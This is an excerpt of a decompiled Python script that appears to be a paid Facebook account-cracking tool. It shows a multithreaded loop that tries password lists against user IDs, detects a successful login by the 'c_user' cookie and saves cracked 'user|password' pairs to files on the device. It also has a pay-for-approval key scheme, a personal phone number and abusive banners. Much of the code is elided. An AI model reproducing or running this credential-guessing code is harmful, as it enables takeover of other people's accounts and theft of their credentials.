# Decompile by ( By Younis John)
# Github - https://biki404-cyber
# Facebook - https://www.facebook.com/bikiterabap
#fuckyou :^)) 
import os
...
def main_apv():
    ...
    if key1 in r1:
        ...
        print ("         ༄BIKI᭄•───────────────────────────────────────•༄MAHAMOOD᭄")
        print ("             \033[1;94mGIVE ME 100RS FOR APROVAL BIKI")     
           
        print ("             \033[1;32mYOUR KEY : "+ak+key1)     
        print ("             Key And Sent Me WP Approvel Your Key ")
        print ("         ༄BIKI MAHAMOOD᭄•───────────────────────────────────────•༄MAHAMOOD᭄")
...
logo="""
        ...
        \033[1;92m༄BIKI᭄•───────────────────────────────────────•༄MAHAMOOD᭄
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;95mAUTHOR   : BIKI MAHAMOOD      \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : BIKI MAHAMOOD      \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : BIKI MAHAMOOD      \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +919957975493      \033[1;93m▇▇
             \033[1;93m▇▇➣       \033[1;91mTHIS TOOL IS PAID          \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGIVE ME 100RS FOR APPROVAL    \033[1;93m▇▇
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
         \033[1;92m༄BIKI᭄•───────────────────────────────────────•༄MAHAMOOD᭄
""" 
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/BIKI-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/BIKI-CP.txt' % (H, P, str(len(cp))))
...
def R():
			...
			print("\033[1;93m▇▇➣\033[1;94m❥❥❥❥❥❥❥  \033[1;94mPUBLIC AC CRACKING  : NO LOGIN😓")
			...
			print ("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥\033[1;94mAB DAFA HO JAO YAHASE  : BIKI-MAHAMOOD")
			print ('\033[1;92m༄BIKI᭄•───────────────────────────────────────•༄MAHAMOOD᭄')
			key = input(" [*] Choose : ")
			print ('༄BIKI᭄•───────────────────────────────────────•༄MAHAMOOD᭄')
			...
			if key in [""]:
				...
				os.system("xdg-open https://chat.whatsapp.com/Iah7XS2Znw54EpxZVdfpmq")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[BIKI]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [BIKI-OK 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/BIKI_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/BIKI_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            with sarfrazssb(max_workers=70) as ssbworld:
                ...
                for zsb in self.id: # Yo Ndak Tau Kok Misty 
...
def dupcutter():
	...
	os.system("xdg-open https://wa.me/+919957975493")
